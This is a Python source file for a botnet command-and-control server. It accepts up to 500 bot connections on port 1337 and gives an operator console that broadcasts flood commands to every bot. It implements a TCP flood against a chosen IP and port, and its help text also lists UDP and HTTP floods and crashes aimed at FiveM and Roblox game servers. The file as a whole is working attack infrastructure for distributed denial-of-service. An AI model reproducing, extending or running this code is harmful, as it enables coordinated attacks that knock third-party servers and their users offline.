import socket
import threading
import time
import json
from threading import Lock

HOST = "0.0.0.0"
PORT = 1337  # Low-key port
bots = {}
bots_lock = Lock()  # To protect the bots dictionary
MAX_BOTS = 500

def broadcast_command(command):
    with bots_lock:
        for bot_id, bot_socket in list(bots.items()):
            try:
                bot_socket.send(command.encode())
                print(f"Sent {command} to {bot_id}")
            except Exception as e:
                print(f"{bot_id} error: {str(e)}")
                try:
                    bot_socket.close()
                except:
                    pass
                del bots[bot_id]

def handle_bot(bot_socket, bot_addr):
    bot_id = f"{bot_addr[0]}:{bot_addr[1]}"
    
    with bots_lock:
        if len(bots) >= MAX_BOTS:
            bot_socket.close()
            return
        bots[bot_id] = bot_socket
    
    print(f"Bot {bot_id} enlisted. Total: {len(bots)}")
    
    try:
        while True:
            try:
                data = bot_socket.recv(1024).decode()
                if not data:
                    break
                print(f"{bot_id}: {data}")
            except ConnectionResetError:
                break
            except Exception as e:
                print(f"Bot {bot_id} error: {str(e)}")
                break
    finally:
        with bots_lock:
            if bot_id in bots:
                del bots[bot_id]
        bot_socket.close()
        print(f"Bot {bot_id} disconnected. Total: {len(bots)}")

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, PORT))
    server.listen(MAX_BOTS + 10)
    print(f"C2 Server active on {HOST}:{PORT}")
    
    threading.Thread(target=command_shell, daemon=True).start()
    
    try:
        while True:
            bot_socket, bot_addr = server.accept()
            bot_thread = threading.Thread(target=handle_bot, args=(bot_socket, bot_addr))
            bot_thread.start()
    except KeyboardInterrupt:
        print("Shutting down server...")
    finally:
        server.close()

def command_shell():
    while True:
        try:
            cmd = input("C2 > ").strip()
            if cmd == "list":
                with bots_lock:
                    print(f"Bots online: {len(bots)} - {list(bots.keys())}")
            elif cmd.startswith("tcpflood"):
                try:
                    parts = cmd.split()
                    if len(parts) != 3:
                        print("Usage: tcpflood <ip> <port>")
                        continue
                    target, port = parts[1], int(parts[2])
                    broadcast_command(f"tcpflood {target} {port}")
                except (IndexError, ValueError):
                    print("Invalid command format. Usage: tcpflood <ip> <port>")
            # Similar error handling for other commands...
            elif cmd == "killall":
                broadcast_command("kill")
                break
            else:
                print("Commands: list, tcpflood <ip> <port>, udpflood <ip> <port>, httpflood <url>, fivemcrash <ip>, robloxlag <ip>, killall")
        except KeyboardInterrupt:
            print("\nUse 'killall' to shutdown all bots or Ctrl+C again to exit")
            break
        except Exception as e:
            print(f"Command error: {str(e)}")

if __name__ == "__main__":
    start_server()
